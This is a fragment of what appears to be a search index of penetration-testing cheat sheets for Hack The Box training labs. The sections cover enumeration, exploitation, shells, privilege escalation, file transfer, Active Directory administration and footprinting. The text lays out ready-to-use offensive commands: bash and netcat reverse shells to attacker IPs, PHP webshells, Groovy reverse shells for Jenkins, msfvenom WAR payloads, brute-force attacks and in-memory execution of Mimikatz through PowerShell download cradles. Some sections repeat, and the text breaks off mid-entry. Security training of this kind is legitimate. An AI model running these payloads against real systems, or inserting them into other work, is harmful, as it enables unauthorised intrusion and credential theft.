10.129.42.254 Brute force SNMP secret string Web Enumeration gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt Run a directory scan on a website gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt Run a sub-domain scan on a website curl -IL https://www.inlanefreight.com Grab website banner whatweb 10.10.10.121 List details about the webserver/certificates curl 10.10.10.121/robots.txt List potential directories in robots.txt ctrl+U View page source (in Firefox) Public Exploits searchsploit openssh 7.2 Search for public exploits for a web application msfconsole MSF: Start the Metasploit Framework search exploit eternalblue MSF: Search for public exploits in MSF use exploit/windows/smb/ms17_010_psexec MSF: Start using an MSF module show options MSF: Show required options for an MSF module set RHOSTS 10.10.10.40 MSF: Set a value for an MSF module option check MSF: Test if the target server is vulnerable exploit MSF: Run the exploit on the target server is vulnerable Using Shells nc -lvnp 1234 Start a nc listener on a local port bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' Send a reverse shell from the remote server rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2>&1\\|nc 10.10.10.10 1234 >/tmp/f Another command to send a reverse shell from the remote server rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2>&1\\|nc -lvp 1234 >/tmp/f Start a bind shell on the remote server nc 10.10.10.1 1234 Connect to a bind shell started on the remote server python -c 'import pty; pty.spawn(\"/bin/bash\")' Upgrade shell TTY (1) ctrl+z then stty raw -echo then fg then enter twice Upgrade shell TTY (2) echo \"<?php system(\\$_GET['cmd']);?>\" > /var/www/html/shell.php Create a webshell php file curl http://SERVER_IP:PORT/shell.php?cmd=id Execute a command on an uploaded webshell Privilege Escalation ./linpeas.sh Run linpeas script to enumerate remote server sudo -l List available sudo privileges sudo -u user /bin/echo Hello World! Run a command with sudo sudo su - Switch to root user (if we have access to sudo su ) sudo su user - Switch to a user (if we have access to sudo su ) ssh-keygen -f key Create a new SSH key echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" >> /root/.ssh/authorized_keys Add the generated public key to the user ssh root@10.10.10.10 -i key SSH to the server with the generated private key Transferring Files python3 -m http.server 8000 Start a local webserver wget http://10.10.14.1:8000/linpeas.sh Download a file on the remote server from our local machine curl http://10.10.14.1:8000/linenum.sh -o linenum.sh Download a file on the remote server from our local machine scp linenum.sh user@remotehost:/tmp/linenum.sh Transfer a file to the remote server with scp (requires SSH access) base64 shell -w 0 Convert a file to base64 echo f0VMR...SNIO...InmDwU \\| base64 -d > shell Convert a file from base64 back to its orig md5sum shell Check the file's md5sum to ensure it converted correctly Linux \u00b6 Command Description man <tool> Opens man pages for the specified tool. <tool> -h Prints the help page of the tool. apropos <keyword> Searches through man pages' descriptions for instances of a given keyword. cat Concatenate and print files. whoami Displays current username. id Returns users identity. hostname Sets or prints the name of the current host system. uname Prints operating system name. pwd Returns working directory name. ifconfig The ifconfig utility is used to assign or view an address to a network interface and/or configure network interface parameters. ip Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels. netstat Shows network status. ss Another utility to investigate sockets. ps Shows process status. who Displays who is logged in. env Prints environment or sets and executes a command. lsblk Lists block devices. lsusb Lists USB devices. lsof Lists opened files. lspci Lists PCI devices. sudo Execute command as a different user. su The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser). A shell is then executed. useradd Creates a new user or update default new user information. userdel Deletes a user account and related files. usermod Modifies a user account. addgroup Adds a group to the system. delgroup Removes a group from the system. passwd Changes user password. dpkg Install, remove and configure Debian-based packages. apt High-level package management command-line utility. aptitude Alternative to apt . snap Install, remove and configure snap packages. gem Standard package manager for Ruby. pip Standard package manager for Python. git Revision control system command-line utility. systemctl Command-line based service and systemd control manager. ps Prints a snapshot of the current processes. journalctl Query the systemd journal. kill Sends a signal to a process. bg Puts a process into background. jobs Lists all processes that are running in the background. fg Puts a process into the foreground. curl Command-line utility to transfer data from or to a server. wget An alternative to curl that downloads files from FTP or HTTP(s) server. python3 -m http.server Starts a Python3 web server on TCP port 8000. ls Lists directory contents. cd Changes the directory. clear Clears the terminal. touch Creates an empty file. mkdir Creates a directory. tree Lists the contents of a directory recursively. mv Move or rename files or directories. cp Copy files or directories. nano Terminal based text editor. which Returns the path to a file or link. find Searches for files in a directory hierarchy. updatedb Updates the locale database for existing contents on the system. locate Uses the locale database to find contents on the system. more Pager that is used to read STDOUT or files. less An alternative to more with more features. head Prints the first ten lines of STDOUT or a file. tail Prints the last ten lines of STDOUT or a file. sort Sorts the contents of STDOUT or a file. grep Searches for specific results that contain given patterns. cut Removes sections from each line of files. tr Replaces certain characters. column Command-line based utility that formats its input into multiple columns. awk Pattern scanning and processing language. sed A stream editor for filtering and transforming text. wc Prints newline, word, and byte counts for a given input. chmod Changes permission of a file or directory. chown Changes the owner and group of a file or directory.","title":"Commands"},{"location":"cheat_sheets/cheatsheet-77/#basic-tools","text":"Command Description General sudo openvpn user.ovpn Connect to VPN ifconfig / ip a Show our IP address netstat -rn Show networks accessible via the VPN ssh user@10.10.10.10 SSH to a remote server ftp 10.129.42.253 FTP to a remote server tmux tmux Start tmux ctrl+b ctrl+c tmux: new window ctrl+b 1 tmux: switch to window ( 1 ) ctrl+% tmux: split pane vertically ctrl+\" tmux: split pane horizontally ctrl+-> tmux: switch to the right pane ctrl+b + : tmux: switch to scroll mode setw -g mouse on tmux: enable mousewheel scrolling Vim vim file vim: open file with vim esc+i vim: enter insert mode esc vim: back to normal mode x vim: Cut character dw vim: Cut word dd vim: Cut full line yw vim: Copy word yy vim: Copy full line p vim: Paste :1 vim: Go to line number 1. :w vim: Write the file 'i.e. save' :q vim: Quit :q! vim: Quit without saving :wq vim: Write and quit","title":"Basic Tools"},{"location":"cheat_sheets/cheatsheet-77/#pentesting","text":"Command Description Service Scanning nmap 10.129.42.253 Run nmap on an IP nmap -sV -sC -p- 10.129.42.253 Run an nmap script scan on an IP locate scripts/citrix List various available nmap scripts nmap --script smb-os-discovery.nse -p445 10.10.10.40 Run an nmap script on an IP netcat 10.10.10.10 22 Grab banner of an open port smbclient -N -L \\\\\\\\10.129.42.253 List SMB Shares smbclient \\\\\\\\10.129.42.253\\\\users Connect to an SMB share snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 Scan SNMP on an IP onesixtyone -c dict.txt 10.129.42.254 Brute force SNMP secret string Web Enumeration gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt Run a directory scan on a website gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt Run a sub-domain scan on a website curl -IL https://www.inlanefreight.com Grab website banner whatweb 10.10.10.121 List details about the webserver/certificates curl 10.10.10.121/robots.txt List potential directories in robots.txt ctrl+U View page source (in Firefox) Public Exploits searchsploit openssh 7.2 Search for public exploits for a web application msfconsole MSF: Start the Metasploit Framework search exploit eternalblue MSF: Search for public exploits in MSF use exploit/windows/smb/ms17_010_psexec MSF: Start using an MSF module show options MSF: Show required options for an MSF module set RHOSTS 10.10.10.40 MSF: Set a value for an MSF module option check MSF: Test if the target server is vulnerable exploit MSF: Run the exploit on the target server is vulnerable Using Shells nc -lvnp 1234 Start a nc listener on a local port bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' Send a reverse shell from the remote server rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2>&1\\|nc 10.10.10.10 1234 >/tmp/f Another command to send a reverse shell from the remote server rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2>&1\\|nc -lvp 1234 >/tmp/f Start a bind shell on the remote server nc 10.10.10.1 1234 Connect to a bind shell started on the remote server python -c 'import pty; pty.spawn(\"/bin/bash\")' Upgrade shell TTY (1) ctrl+z then stty raw -echo then fg then enter twice Upgrade shell TTY (2) echo \"<?php system(\\$_GET['cmd']);?>\" > /var/www/html/shell.php Create a webshell php file curl http://SERVER_IP:PORT/shell.php?cmd=id Execute a command on an uploaded webshell Privilege Escalation ./linpeas.sh Run linpeas script to enumerate remote server sudo -l List available sudo privileges sudo -u user /bin/echo Hello World! Run a command with sudo sudo su - Switch to root user (if we have access to sudo su ) sudo su user - Switch to a user (if we have access to sudo su ) ssh-keygen -f key Create a new SSH key echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" >> /root/.ssh/authorized_keys Add the generated public key to the user ssh root@10.10.10.10 -i key SSH to the server with the generated private key Transferring Files python3 -m http.server 8000 Start a local webserver wget http://10.10.14.1:8000/linpeas.sh Download a file on the remote server from our local machine curl http://10.10.14.1:8000/linenum.sh -o linenum.sh Download a file on the remote server from our local machine scp linenum.sh user@remotehost:/tmp/linenum.sh Transfer a file to the remote server with scp (requires SSH access) base64 shell -w 0 Convert a file to base64 echo f0VMR...SNIO...InmDwU \\| base64 -d > shell Convert a file from base64 back to its orig md5sum shell Check the file's md5sum to ensure it converted correctly","title":"Pentesting"},{"location":"cheat_sheets/cheatsheet-77/#linux","text":"Command Description man <tool> Opens man pages for the specified tool. <tool> -h Prints the help page of the tool. apropos <keyword> Searches through man pages' descriptions for instances of a given keyword. cat Concatenate and print files. whoami Displays current username. id Returns users identity. hostname Sets or prints the name of the current host system. uname Prints operating system name. pwd Returns working directory name. ifconfig The ifconfig utility is used to assign or view an address to a network interface and/or configure network interface parameters. ip Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels. netstat Shows network status. ss Another utility to investigate sockets. ps Shows process status. who Displays who is logged in. env Prints environment or sets and executes a command. lsblk Lists block devices. lsusb Lists USB devices. lsof Lists opened files. lspci Lists PCI devices. sudo Execute command as a different user. su The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser). A shell is then executed. useradd Creates a new user or update default new user information. userdel Deletes a user account and related files. usermod Modifies a user account. addgroup Adds a group to the system. delgroup Removes a group from the system. passwd Changes user password. dpkg Install, remove and configure Debian-based packages. apt High-level package management command-line utility. aptitude Alternative to apt . snap Install, remove and configure snap packages. gem Standard package manager for Ruby. pip Standard package manager for Python. git Revision control system command-line utility. systemctl Command-line based service and systemd control manager. ps Prints a snapshot of the current processes. journalctl Query the systemd journal. kill Sends a signal to a process. bg Puts a process into background. jobs Lists all processes that are running in the background. fg Puts a process into the foreground. curl Command-line utility to transfer data from or to a server. wget An alternative to curl that downloads files from FTP or HTTP(s) server. python3 -m http.server Starts a Python3 web server on TCP port 8000. ls Lists directory contents. cd Changes the directory. clear Clears the terminal. touch Creates an empty file. mkdir Creates a directory. tree Lists the contents of a directory recursively. mv Move or rename files or directories. cp Copy files or directories. nano Terminal based text editor. which Returns the path to a file or link. find Searches for files in a directory hierarchy. updatedb Updates the locale database for existing contents on the system. locate Uses the locale database to find contents on the system. more Pager that is used to read STDOUT or files. less An alternative to more with more features. head Prints the first ten lines of STDOUT or a file. tail Prints the last ten lines of STDOUT or a file. sort Sorts the contents of STDOUT or a file. grep Searches for specific results that contain given patterns. cut Removes sections from each line of files. tr Replaces certain characters. column Command-line based utility that formats its input into multiple columns. awk Pattern scanning and processing language. sed A stream editor for filtering and transforming text. wc Prints newline, word, and byte counts for a given input. chmod Changes permission of a file or directory. chown Changes the owner and group of a file or directory.","title":"Linux"},{"location":"cheat_sheets/cheatsheet_aid/","text":"Cheat Sheet IAD \u00b6 General Commands \u00b6 Get-Module Returns a list of loaded PowerShell Modules. Get-Command -Module ActiveDirectory Lists commands for the module specified. Get-Help <cmd-let> Shows help syntax for the cmd-let specified. Import-Module ActiveDirectory Imports the Active Directory Module Active Directory PowerShell Commands \u00b6 AD User Commands \u00b6 New-ADUser -Name \"first last\" -Accountpassword (Read-Host -AsSecureString \"Super$ecurePassword!\") -Enabled $true -OtherAttributes @{'title'=\"Analyst\";'mail'=\"f.last@domain.com\"} Add a user to AD and set attributes. Remove-ADUser -Identity <name> Removes a user from AD with the identity of 'name'. Unlock-ADAccount -Identity <name> Unlocks a user account with the identity of 'name'. Set-ADAccountPassword -Identity <'name'> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText \"NewP@ssw0rdReset!\" -Force) Set the password of an AD user to the password specified. Set-ADUser -Identity amasters -ChangePasswordAtLogon $true Force a user to change their password at next logon attempt. AD Group Commands \u00b6 New-ADOrganizationalUnit -Name \"name\" -Path \"OU=folder,DC=domain,DC=local\" Create a new AD OU container named \"name\" in the path specified. New-ADGroup -Name \"name\" -SamAccountName analysts -GroupCategory Security -GroupScope Global -DisplayName \"Security Analysts\" -Path \"CN=Users,DC=domain,DC=local\" -Description \"Members of this group are Security Analysts under the IT OU\" Create a new security group named \"name\" with the accompanying attributes. Add-ADGroupMember -Identity 'group name' -Members 'ACepheus,OStarchaser,ACallisto' Add an AD user to the group specified. GPO Commands \u00b6 Copy-GPO -SourceName \"GPO to copy\" -TargetName \"Name\" Copy a GPO for use as a new GPO with a target name of \"name\". Set-GPLink -Name \"Security Analysts Control\" -Target \"ou=Security Analysts,ou=IT,OU=HQ-NYC,OU=Employees,OU=Corp,dc=INLANEFREIGHT,dc=LOCAL\" -LinkEnabled Yes Link a GPO for use to a specific OU or security group. Computer Commands \u00b6 Add-Computer -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\\HTB-student_adm' -Restart Add a new computer to the domain using the credentials specified. Add-Computer -ComputerName 'name' -LocalCredential '.\\localuser' -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\\htb-student_adm' -Restart Remotely add a computer to a domain. Get-ADComputer -Identity \"name\" -Properties * | select CN,CanonicalName,IPv4Address Check for a computer named \"name\" and view its properties. References \u00b6 Microsoft","title":"IAD"},{"location":"cheat_sheets/cheatsheet_aid/#cheat-sheet-iad","text":"","title":"Cheat Sheet IAD"},{"location":"cheat_sheets/cheatsheet_aid/#general-commands","text":"Get-Module Returns a list of loaded PowerShell Modules. Get-Command -Module ActiveDirectory Lists commands for the module specified. Get-Help <cmd-let> Shows help syntax for the cmd-let specified. Import-Module ActiveDirectory Imports the Active Directory Module","title":"General Commands"},{"location":"cheat_sheets/cheatsheet_aid/#active-directory-powershell-commands","text":"","title":"Active Directory PowerShell Commands"},{"location":"cheat_sheets/cheatsheet_aid/#ad-user-commands","text":"New-ADUser -Name \"first last\" -Accountpassword (Read-Host -AsSecureString \"Super$ecurePassword!\") -Enabled $true -OtherAttributes @{'title'=\"Analyst\";'mail'=\"f.last@domain.com\"} Add a user to AD and set attributes. Remove-ADUser -Identity <name> Removes a user from AD with the identity of 'name'. Unlock-ADAccount -Identity <name> Unlocks a user account with the identity of 'name'. Set-ADAccountPassword -Identity <'name'> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText \"NewP@ssw0rdReset!\" -Force) Set the password of an AD user to the password specified. Set-ADUser -Identity amasters -ChangePasswordAtLogon $true Force a user to change their password at next logon attempt.","title":"AD User Commands"},{"location":"cheat_sheets/cheatsheet_aid/#ad-group-commands","text":"New-ADOrganizationalUnit -Name \"name\" -Path \"OU=folder,DC=domain,DC=local\" Create a new AD OU container named \"name\" in the path specified. New-ADGroup -Name \"name\" -SamAccountName analysts -GroupCategory Security -GroupScope Global -DisplayName \"Security Analysts\" -Path \"CN=Users,DC=domain,DC=local\" -Description \"Members of this group are Security Analysts under the IT OU\" Create a new security group named \"name\" with the accompanying attributes. Add-ADGroupMember -Identity 'group name' -Members 'ACepheus,OStarchaser,ACallisto' Add an AD user to the group specified.","title":"AD Group Commands"},{"location":"cheat_sheets/cheatsheet_aid/#gpo-commands","text":"Copy-GPO -SourceName \"GPO to copy\" -TargetName \"Name\" Copy a GPO for use as a new GPO with a target name of \"name\". Set-GPLink -Name \"Security Analysts Control\" -Target \"ou=Security Analysts,ou=IT,OU=HQ-NYC,OU=Employees,OU=Corp,dc=INLANEFREIGHT,dc=LOCAL\" -LinkEnabled Yes Link a GPO for use to a specific OU or security group.","title":"GPO Commands"},{"location":"cheat_sheets/cheatsheet_aid/#computer-commands","text":"Add-Computer -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\\HTB-student_adm' -Restart Add a new computer to the domain using the credentials specified. Add-Computer -ComputerName 'name' -LocalCredential '.\\localuser' -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\\htb-student_adm' -Restart Remotely add a computer to a domain. Get-ADComputer -Identity \"name\" -Properties * | select CN,CanonicalName,IPv4Address Check for a computer named \"name\" and view its properties.","title":"Computer Commands"},{"location":"cheat_sheets/cheatsheet_aid/#references","text":"Microsoft","title":"References"},{"location":"cheat_sheets/common_apps/","text":"Command Description sudo vim /etc/hosts Opens the /etc/hosts with vim to start adding hostnames sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list Runs an nmap scan using common web application ports based on a scope list ( scope_list ) and outputs to a file ( web_discovery ) in all formats ( -oA ) eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated> Runs eyewitness using a file generated by an nmap scan ( web_discovery.xml ) and creates a directory ( -d ) cat web_discovery.xml \\| ./aquatone -nmap Concatenates the contents of nmap scan output (web_discovery.xml) and pipes it ( | ) aquatone ( ./aquatone )and ensures aquatone recognizes the file as nmap scan output ( -nmap ) sudo wpscan --url <http://domainnameoripaddress> --enumerate Runs wpscan using the --enmuerate flag. Can replace the url with any valid and reachable URL in each challenge sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress> Runs wpscan and uses it to perform a password attack ( --password-attack ) against the specified url and references a word list ( /usr/share/wordlists/rockyou.txt ) curl -s http://<hostnameoripoftargetsite/path/to/webshell.php?cmd=id cURL command used to execute commands ( cmd=id ) on a vulnerable system utilizing a php-based webshell <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'\"); PHP code that will execute a reverse shell on a Linux-based system droopescan scan joomla --url http://<domainnameoripaddress> Runs droopescan against a joomla site located at the specified url sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list> Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist ( /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt ) and user or list of usernames ( -usr ) <?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?> PHP code that will allow for web shell access on a vulnerable drupal site. Can be used through browisng to the location of the file in the web directory after saving. Can also be leveraged utilizing curl. See next command. curl -s <http://domainname or IP address of site> /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \\| grep uid \\| cut -f4 -d\">\" Uses curl to navigate to php web shell file and run system commands ( =id ) on the target gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt gobuster powered directory brute forcing attack refrencing a wordlist ( /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt ) auxiliary/scanner/http/tomcat_mgr_login Useful Metasploit scanner module used to perform a bruteforce login attack against a tomcat site python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt Runs mgr_brute.py using python3 against the specified website starts in the /manager directory ( -P /manager ) and references a specified user or userlist ( -u ) as well as a specified password or password list ( -p ) msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war Generates a jsp-based reverse shell payload in the form of a .war file utilizing msfvenom nmap -sV -p 8009,8080 <domainname or IP address of tomcat site> Nmap scan useful in enumerating Apache Tomcat and AJP services r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \\| while read line; do \\$line 2>&5 >&5; done\"] as String[]) p.waitFor() Groovy-based reverse shell payload/code that can work with admin access to the Script Console of a Jenkins site. Will work when the underlying OS is Linux def cmd = \"cmd.exe /c dir\".execute(); println(\"${cmd.text}\"); Groovy-based payload/code that can work with admin access to the Script Console of a Jenkins site. This will allow webshell access and to execute commands on the underlying Windows system String host=\"localhost\"; int port=8044; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So); Groovy-based reverse shell payload/code that can work with admin acess to the Script Console of a Jenkins site. Will work when the underlying OS is Windows reverse_shell_splunk A simple Splunk package for obtaining revershells on Windows and Linux systems","title":"Common Applications"},{"location":"cheat_sheets/deobfuscation/","text":"Commands \u00b6 Command Description curl http:/SERVER_IP:PORT/ cURL GET request curl -s http:/SERVER_IP:PORT/ -X POST cURL POST request curl -s http:/SERVER_IP:PORT/ -X POST -d \"param1=sample\" cURL POST request with data echo hackthebox \\| base64 base64 encode echo ENCODED_B64 \\| base64 -d base64 decode echo hackthebox \\| xxd -p hex encode echo ENCODED_HEX \\| xxd -p -r hex decode echo hackthebox \\| tr 'A-Za-z' 'N-ZA-Mn-za-m' rot13 encode echo ENCODED_ROT13 \\| tr 'A-Za-z' 'N-ZA-Mn-za-m' rot13 decode Deobfuscation Websites \u00b6 Website JS Console Prettier Beautifier JSNice","title":"(De)Obfuscation"},{"location":"cheat_sheets/deobfuscation/#commands","text":"Command Description curl http:/SERVER_IP:PORT/ cURL GET request curl -s http:/SERVER_IP:PORT/ -X POST cURL POST request curl -s http:/SERVER_IP:PORT/ -X POST -d \"param1=sample\" cURL POST request with data echo hackthebox \\| base64 base64 encode echo ENCODED_B64 \\| base64 -d base64 decode echo hackthebox \\| xxd -p hex encode echo ENCODED_HEX \\| xxd -p -r hex decode echo hackthebox \\| tr 'A-Za-z' 'N-ZA-Mn-za-m' rot13 encode echo ENCODED_ROT13 \\| tr 'A-Za-z' 'N-ZA-Mn-za-m' rot13 decode","title":"Commands"},{"location":"cheat_sheets/deobfuscation/#deobfuscation-websites","text":"Website JS Console Prettier Beautifier JSNice","title":"Deobfuscation Websites"},{"location":"cheat_sheets/file_transfer/","text":"Command Description Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1 Download a file with PowerShell IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1') Execute a file in memory using PowerShell Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64 Upload a file with PowerShell bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe Download a file using Bitsadmin certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe Download a file using Certutil wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh Download a file using Wget curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh Download a file using cURL php -r '$file = file_get_contents(\"https://<snip>/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);' Download a file using PHP scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip Upload a file using SCP scp user@target:/tmp/mimikatz.exe C:\\Temp\\mimikatz.exe Download a file using SCP Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile \"nc.exe\" Invoke-WebRequest using a Chrome User Agent","title":"File Transfer"},{"location":"cheat_sheets/footprinting/","text":"Infrastructure-based Enumeration \u00b6 Command Description curl -s https://crt.sh/\\?q\\=<target-domain>\\&output\\=json \\| jq . Certificate transparency. for i in $(cat ip-addresses.txt);do shodan host $i;done Scan each IP address in a list using Shodan. Host-based Enumeration \u00b6 FTP \u00b6 Command Description ftp <FQDN/IP> Interact with the FTP service on the target. nc -nv <FQDN/IP> 21 Interact with the FTP service on the target. telnet <FQDN/IP> 21 Interact with the FTP service on the target. openssl s_client -connect <FQDN/IP>:21 -starttls ftp Interact with the FTP service on the target using encrypted connection. wget -m --no-passive ftp://anonymous:anonymous@<target> Download all available files on the target FTP server. SMB \u00b6 Command Description smbclient -N -L //<FQDN/IP> Null session authentication on SMB. smbclient //<FQDN/IP>/<share> Connect to a specific SMB share. rpcclient -U \"\" <FQDN/IP> Interaction with the target using RPC. samrdump.py <FQDN/IP> Username enumeration using Impacket scripts. smbmap -H <FQDN/IP> Enumerating SMB shares. crackmapexec smb <FQDN/IP> --shares -u '' -p '' Enumerating SMB shares using null session authentication. enum4linux-ng.py <FQDN/IP> -A SMB enumeration using enum4linux. NFS \u00b6 Command Description showmount -e <FQDN/IP> Show available NFS shares. mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock Mount the specific NFS share.umount ./target-NFS umount ./target-NFS Unmount the specific NFS share. DNS \u00b6 Command Description dig ns <domain.tld> @<nameserver> NS request to the specific nameserver. dig any <domain.tld> @<nameserver> ANY request to the specific nameserver. dig axfr <domain.tld> @<nameserver> AXFR request to the specific nameserver. dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld> Subdomain brute forcing. SMTP \u00b6 Command Description telnet <FQDN/IP> 25 IMAP/POP3 \u00b6 Command Description curl -k 'imaps://<FQDN/IP>' --user <user>:<password> Log in to the IMAPS service using cURL. openssl s_client -connect <FQDN/IP>:imaps Connect to the IMAPS service. openssl s_client -connect <FQDN/IP>:pop3s Connect to the POP3s service. SNMP \u00b6 Command Description snmpwalk -v2c -c <community string> <FQDN/IP> Querying OIDs using snmpwalk. onesixtyone -c community-strings.list <FQDN/IP> Bruteforcing community strings of the SNMP service. braa <community string>@<FQDN/IP>:.1.* Bruteforcing SNMP service OIDs. MySQL \u00b6 Command Description mysql -u <user> -p<password> <FQDN/IP> Login to the MySQL server. MSSQL \u00b6 Command Description mssqlclient.py <user>@<FQDN/IP> -windows-auth Log in to the MSSQL server using Windows authentication. IPMI \u00b6 Command Description msf6 auxiliary(scanner/ipmi/ipmi_version) IPMI version detection. msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) Dump IPMI hashes. Linux Remote Management \u00b6 Command Description ssh-audit.py <FQDN/IP> Remote security audit against the target SSH service. ssh <user>@<FQDN/IP> Log in to the SSH server using the SSH client. ssh -i private.key <user>@<FQDN/IP> Log in to the SSH server using private key. ssh <user>@<FQDN/IP> -o PreferredAuthentications=password Enforce password-based authentication. Windows Remote Management \u00b6 Command Description rdp-sec-check.pl <FQDN/IP> Check the security settings of the RDP service. xfreerdp /u:<user> /p:\"<password>\" /v:<FQDN/IP> Log in to the RDP server from Linux. evil-winrm -i <FQDN/IP> -u <user> -p <password> Log in to the WinRM server. wmiexec.py <user>:\"<password>\"@<FQDN/IP> \"<system command>\" Execute command using the WMI service.","title":"Footprinting"},{"location":"cheat_sheets/footprinting/#infrastructure-based-enumeration","text":"Command Description curl -s https://crt.sh/\\?q\\=<target-domain>\\&output\\=json \\| jq . Certificate transparency. for i in $(cat ip-addresses.txt);do shodan host $i;done Scan each IP address in a list using Shodan.","title":"Infrastructure-based Enumeration"},{"location":"cheat_sheets/footprinting/#host-based-enumeration","text":"","title":"Host-based Enumeration"},{"location":"cheat_sheets/footprinting/#ftp","text":"Command Description ftp <FQDN/IP> Interact with the FTP service on the target. nc -nv <FQDN/IP> 21 Interact with the FTP service on the target. telnet <FQDN/IP> 21 Interact with the FTP service on the target. openssl s_client -connect <FQDN/IP>:21 -starttls ftp Interact with the FTP service on the target using encrypted connection. wget -m --no-passive ftp://anonymous:anonymous@<target> Download all available files on the target FTP server.","title":"FTP"},{"location":"cheat_sheets/footprinting/#smb","text":"Command Description smbclient -N -L //<FQDN/IP> Null session authentication on SMB. smbclient //<FQDN/IP>/<share> Connect to a specific SMB share. rpcclient -U \"\" <FQDN/IP> Interaction with the target using RPC. samrdump.py <FQDN/IP> Username enumeration using Impacket scripts. smbmap -H <FQDN/IP> Enumerating SMB shares. crackmapexec smb <FQDN/IP> --shares -u '' -p '' Enumerating SMB shares using null session authentication. enum4linux-ng.py <FQDN/IP> -A SMB enumeration using enum4linux.","title":"SMB"},{"location":"cheat_sheets/footprinting/#nfs","text":"Command Description showmount -e <FQDN/IP> Show available NFS shares. mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock Mount the specific NFS share.umount ./target-NFS umount ./target-NFS Unmount the specific NFS share.","title":"NFS"},{"location":"cheat_sheets/footprinting/#dns","text":"Command Description dig ns <domain.tld> @<nameserver> NS request to the specific nameserver. dig any <domain.tld> @<nameserver> ANY request to the specific nameserver. dig axfr <domain.tld> @<nameserver> AXFR request to the specific nameserver. dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld> Subdomain brute forcing.","title":"DNS"},{"location":"cheat_sheets/footprinting/#smtp","text":"Command Description telnet <FQDN/IP> 25","title":"SMTP"},{"location":"cheat_sheets/footprinting/#imappop3","text":"Command Description curl -k 'imaps://<FQDN/IP>' --user <user>:<password> Log in to the IMAPS service using cURL. openssl s_client -connect <FQDN/IP>:imaps Connect to the IMAPS service. openssl s_client -connect <FQDN/IP>:pop3s Connect to the POP3s service.","title":"IMAP/POP3"},{"location":"cheat_sheets/footprinting/#snmp","text":"Command Description snmpwalk -v2c -c <community string> <FQDN/IP> Querying OIDs using snmpwalk. onesixtyone -c community-strings.list <FQDN/IP> Bruteforcing community strings of the SNMP service. braa <community string>@<FQDN/IP>:.1.* Bruteforcing SNMP service OIDs.","title":"SNMP"},{"location":"cheat_sheets/footprinting/#mysql","text":"Command Description mysql -u <user> -p<password> <FQDN/IP> Login to the MySQL server.","title":"MySQL"},{"location":"cheat_sheets/footprinting/#mssql","text":"Command Description mssqlclient.py <user>@<FQDN/IP> -windows-auth Log in to the MSSQL server using Windows authentication.","title":"MSSQL"},{"location":"cheat_sheets/footprinting/#ipmi","text":"Command Description msf6 